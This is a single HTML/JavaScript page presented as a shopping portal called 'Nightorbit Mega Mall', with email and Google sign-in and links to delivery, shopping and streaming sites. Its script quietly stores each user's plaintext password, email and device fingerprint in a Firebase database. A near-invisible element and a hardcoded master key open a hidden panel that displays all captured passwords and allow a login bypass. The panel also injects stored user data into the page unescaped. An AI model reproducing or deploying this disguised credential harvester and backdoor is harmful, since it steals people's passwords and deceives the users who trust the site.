<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nightorbit Mega Mall - Elite Version</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    
    <style>
        :root { --primary: #00d2ff; --neon: #ff0055; --gold: #ffd700; --bg: #05070a; }
        * { box-sizing: border-box; }
        body { 
            margin: 0; background: radial-gradient(circle, #1B2735 0%, var(--bg) 100%);
            font-family: 'Segoe UI', sans-serif; color: white;
            display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden;
        }

        .card { 
            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px);
            padding: 35px; border-radius: 35px; text-align: center; 
            width: 95%; max-width: 420px; border: 1px solid rgba(255,255,255,0.1); 
            box-shadow: 0 0 40px rgba(0, 210, 255, 0.2); animation: fadeIn 0.8s ease;
        }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        input { 
            width: 100%; padding: 14px; margin: 10px 0; border-radius: 15px; 
            border: 1px solid rgba(0,210,255,0.3); background: rgba(0,0,0,0.5); 
            color: white; outline: none; transition: 0.3s;
        }

        .btn-main { 
            background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; 
            border: none; padding: 15px; border-radius: 15px; cursor: pointer; 
            width: 100%; font-weight: bold; margin-top: 10px; transition: 0.3s;
            text-shadow: 0 0 5px rgba(255,255,255,0.5); letter-spacing: 1px;
        }

        .item-link { 
            background: rgba(255,255,255,0.06); padding: 14px; border-radius: 18px; 
            margin: 10px 0; display: flex; justify-content: space-between; align-items: center; 
            text-decoration: none; color: white; border-left: 5px solid var(--primary); 
            transition: 0.4s; font-size: 14px;
        }

        #admin-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; display: none; padding: 30px; overflow-y: auto; }
        
        #logout-overlay { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: #000; z-index: 2000; display: none; 
            flex-direction: column; align-items: center; justify-content: center; text-align: center;
            opacity: 0; transition: 1.5s ease; padding: 20px;
        }
        
        .hidden { display: none !important; }
        .dots-menu { position: absolute; top: 20px; left: 20px; cursor: pointer; font-size: 25px; color: var(--primary); opacity: 0.2; }
        .admin-trigger { position: absolute; bottom: 10px; right: 10px; font-size: 12px; color: rgba(255,255,255,0.05); cursor: pointer; }
        
        .del-btn { background: #ff3333; color: white; border: none; padding: 5px 12px; border-radius: 8px; font-size: 10px; cursor: pointer; margin-left: 5px; }
    </style>
</head>
<body>

    <div class="dots-menu" onclick="masterBypass()">‚ãÆ</div>
    <div class="admin-trigger" onclick="openAdmin()">.</div>

    <div id="logout-overlay">
        <div style="font-size: 60px; margin-bottom: 20px;">üåô</div>
        <div id="bye-msg" style="font-size: 18px; color: var(--primary); line-height: 1.8; font-weight: 500;"></div>
        <div style="margin-top: 30px; color: #333; letter-spacing: 5px; font-size: 10px;">SECURE DISCONNECT</div>
    </div>

    <div id="admin-panel">
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
            <h2 style="color: var(--primary); margin: 0;">Server Database</h2>
            <button onclick="clearAllData()" style="background: red; color: white; border: none; padding: 8px 15px; border-radius: 10px; font-size: 12px; cursor: pointer;">CLEAR ALL INFO</button>
        </div>
        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 10px 30px;">Close Logs</button>
        <div id="user-list-display" style="margin-top: 30px;"></div>
    </div>

    <div id="login-box" class="card">
        <h1 style="color: var(--primary); margin: 0; letter-spacing: 4px; font-weight: 800;">NIGHTORBIT</h1>
        <p style="color: #666; font-size: 11px; margin-bottom: 25px;">PREMIUM BAZAAR SYSTEM</p>
        <input type="email" id="email-in" placeholder="Email Address">
        <input type="password" id="pass-in" placeholder="Password">
        <button class="btn-main" onclick="emailAuth()">LOG IN / SIGN UP</button>
        <button class="btn-main" style="background:white; color:black; margin-top:15px;" onclick="googleAuth()">SIGN IN WITH GOOGLE</button>
    </div>

    <div id="main-page" class="card hidden">
        <h2 id="welcome-name" style="color: var(--primary);">Welcome</h2>
        <a href="https://www.foodpanda.pk" target="_blank" class="item-link">üêº Foodpanda <span>PK</span></a>
        <a href="https://www.daraz.pk" target="_blank" class="item-link">üõçÔ∏è Daraz Mall <span>Shop</span></a>
        <a href="https://www.netflix.com" target="_blank" class="item-link" style="border-left-color: var(--neon);">üéûÔ∏è Watch Movies</a>
        <button onclick="triggerLogout()" style="background:none; border:none; color:rgba(255,255,255,0.2); cursor:pointer; margin-top:30px; font-size:11px;">LOGOUT SESSION</button>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBxJqJkrAaFf3eR0QWvhet6IvvFVHYExeU",
            authDomain: "my-market-ff254.firebaseapp.com",
            projectId: "my-market-ff254",
            storageBucket: "my-market-ff254.appspot.com",
            messagingSenderId: "1039626785987",
            appId: "1:1039626785987:web:ae5a65a0b16444a2cffe76",
            databaseURL: "https://my-market-ff254-default-rtdb.firebaseio.com"
        };

        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.database();
        let globalUser = "User";

        function getMyDevice() {
            const ua = navigator.userAgent;
            let model = "Web Browser";
            if (ua.match(/\(([^)]+)\)/)) {
                let section = ua.match(/\(([^)]+)\)/)[1];
                let parts = section.split(';');
                model = parts.length > 2 ? parts[parts.length - 1].trim().split('Build/')[0].split('WV')[0].trim() : parts[0];
            }
            const brands = ["INFINIX", "SAMSUNG", "REALME", "OPPO", "VIVO", "TECNO", "REDMI", "XIAOMI", "IPHONE"];
            for(let b of brands) { if(ua.toUpperCase().includes(b)) return (b + " " + model).toUpperCase(); }
            return model.toUpperCase();
        }

        function masterBypass() {
            if(prompt("Key:") === "rr123456789000rr") {
                handleLogin({uid: "admin_fix", email: "Admin@Bypass.com"}, "Master Key");
            }
        }
        
        function openAdmin() {
            if (prompt("Admin Key:") === "rr123456789000rr") {
                document.getElementById('admin-panel').style.display = 'block';
                db.ref('users').on('value', snap => {
                    let html = "";
                    snap.forEach(s => {
                        let d = s.val();
                        html += `<div style="background:rgba(255,255,255,0.05); padding:15px; margin-bottom:12px; border-radius:20px; text-align:left; border:1px solid #333">
                            <b style="color:var(--primary)">Name: ${d.savedName}</b><br>
                            Pass: <span style="color:var(--gold)">${d.password}</span><br>
                            Device: <span style="color:#00ff00; font-size:10px;">${d.deviceInfo}</span><br>
                            <small style="color:#666">${d.email} | ${d.lastSeen}</small>
                            <br><div style="margin-top:10px;">
                                <button onclick="renameUser('${s.key}')" style="font-size:10px; padding:5px 10px;">Rename</button>
                                <button class="del-btn" onclick="deleteInfo('${s.key}')">DELETE INFO</button>
                            </div>
                        </div>`;
                    });
                    document.getElementById('user-list-display').innerHTML = html;
                });
            }
        }

        function deleteInfo(id) {
            if(confirm("Are you sure you want to delete this user info?")) {
                db.ref('users/' + id).remove();
            }
        }

        function clearAllData() {
            if(confirm("DANGER: Are you sure you want to clear ALL user data from database?")) {
                db.ref('users').remove();
            }
        }

        function renameUser(id) {
            let n = prompt("New Name:");
            if(n) db.ref('users/'+id).update({savedName: n});
        }

        function googleAuth() {
            const provider = new firebase.auth.GoogleAuthProvider();
            auth.signInWithPopup(provider).then(res => handleLogin(res.user, "Google Account")).catch(e => alert(e.message));
        }

        function emailAuth() {
            const e = document.getElementById('email-in').value, p = document.getElementById('pass-in').value;
            if(!e || !p) return alert("Enter Details");
            auth.signInWithEmailAndPassword(e, p).then(res => handleLogin(res.user, p))
            .catch(() => auth.createUserWithEmailAndPassword(e, p).then(res => handleLogin(res.user, p)));
        }

        function handleLogin(user, p) {
            db.ref('users/' + user.uid).once('value', snap => {
                let d = snap.val();
                globalUser = d && d.savedName ? d.savedName : (user.displayName || user.email.split('@')[0]);
                let finalPass = (p === "Session" || p === "Google Account") ? (d ? d.password : p) : p;

                db.ref('users/' + user.uid).update({
                    email: user.email,
                    password: finalPass,
                    savedName: globalUser,
                    deviceInfo: getMyDevice(),
                    lastSeen: new Date().toLocaleString()
                }).then(() => {
                    document.getElementById('login-box').classList.add('hidden');
                    document.getElementById('main-page').classList.remove('hidden');
                    document.getElementById('welcome-name').innerText = "Hello, " + globalUser;
                });
            });
        }

        function triggerLogout() {
            const overlay = document.getElementById('logout-overlay');
            const wish = `Allah Hafiz, Mere Pyare User <b>${globalUser}</b>!<br>
            Aapka Hamari Website Par Aana Humare Liye Khushi Ki Baat Thi.<br>
            Umeed Hai Aapka Waqt Nightorbit Par Acha Guzra Hoga.<br>
            Hum Aapki Salamti Aur Khushiyon Ke Liye Dua-Go Hain.<br>
            Zindagi Rahi To Phir Se Zaroor Mulaqat Hogi.<br>
            Tab Tak Apna Aur Apne Pyaaron Ka Bohot Khayal Rakhiyega.<br>
            Allah Aapko Hamesha Apni Hifz-o-Aman Mein Rakhe.<br>
            Good Bye My Sweet Friend, See You Soon!<br>
            ‚ú® Shukriya Aur Khuda Hafiz ‚ú®`;
            
            document.getElementById('bye-msg').innerHTML = wish;
            overlay.style.display = 'flex';
            setTimeout(() => { overlay.style.opacity = '1'; }, 100);
            setTimeout(() => { auth.signOut().then(() => location.reload()); }, 7000);
        }

        auth.onAuthStateChanged(u => { if(u) handleLogin(u, "Session"); });
    </script>
</body>
            </html>
